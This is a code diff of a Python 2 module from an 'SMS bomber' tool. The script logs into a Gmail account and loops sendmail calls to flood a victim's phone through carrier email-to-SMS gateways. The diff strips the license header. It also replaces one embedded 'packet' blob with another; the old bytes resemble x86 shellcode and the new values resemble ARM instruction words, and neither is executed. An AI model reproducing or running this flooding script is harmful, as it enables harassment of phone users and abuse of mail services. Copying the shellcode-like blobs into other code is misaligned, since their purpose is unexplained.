@@ -1,42 +1,23 @@
 #!/usr/bin/python
-#----------------------------------------------------------------------------
-#Main Disrupt SMSBomber Modules 
-#----------------------------------------------------------------------------
-#The MIT License (MIT)
-#
-#Copyright (c) 2015 Matt Perez
-#
-#Permission is hereby granted, free of charge, to any person obtaining a copy
-#of this software and associated documentation files (the "Software"), to deal
-#in the Software without restriction, including without limitation the rights
-#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-#copies of the Software, and to permit persons to whom the Software is
-#furnished to do so, subject to the following conditions:
-#
-#The above copyright notice and this permission notice shall be included in
-#all copies or substantial portions of the Software.
-#
-#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
-#THE SOFTWARE.
 import sys
 import getpass
 import smtplib as s
 import options
 import colors
 
-#Total 93 bytes for this packet
-packet = """
-		\xe4\xff\xff\x2f\xb5\xee\xe8\xb3\xa3\xe4\xf6\x48\xe8\xad\xf8
-		\x6a\x4f\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xb7\x3d
-		\x52\x0c\x7f\x9c\x3c\x6f\x9d\x73\xe5\x31\x26\xaa\xa3\xb6\xdf
-		\xd0\xb8\x8a\xe7\xde\x86\xc2\x9c\x38\x1b\x01\xcc\x84\xb5\x11
-		\x8d\x39\x78\x30\xac\x3f\x55\xcd\xff\xaf\x3c\x6f\xbd\x73\xf5
-		"""
+packet = (
+            0xE59FC044,0xE28F0020,
+            0xE1A0E00F,0xE1A0F00C,
+            0xE59FC038,0xE28F0024,
+            0xE3A03000,0xE3A02000,
+            0xE3A01000,0xE1A0E00F,
+            0xE1A0F00C,0x00650063,
+            0x006C006C,0x006F0063,
+            0x00650072,0x00000000,
+            0x00310033,0x00330033,
+            0x00000037,0x03F6272C,
+            0x02E806DC
+        )
 
 def SMSBomb():
     gmail_username = raw_input('\n\t[!] Enter Secure Gmail: ') 
@@ -45,7 +26,6 @@ def SMSBomb():
     smtp_port = 587
     msg_from = '\x01'
     msg_subject = '\x01' 
-    #Fix menu issue
     print"""
 	[1] AT&T
 	[2] Boost Mobile
@@ -78,11 +58,10 @@ def SMSBomb():
     session = s.SMTP(smtp_server, smtp_port)
     session.ehlo()
     session.starttls()
-    session.ehlo()
     session.login(gmail_username, gmail_password)
     for i in xrange(int(thread_send)):
         session.sendmail(msg_from, msg_to, thread_sending)
-        print"[!] Threads sent '%s'" % (len(packet))
+    print"[!] Threads sent '%s'" % (len(packet))
     session.quit()
     reset_smsbomber_module = raw_input("\nWould you like to send some more threads (Y/n): ")
     if reset_smsbomber_module == 'Y' or reset_smsbomber_module == 'y':
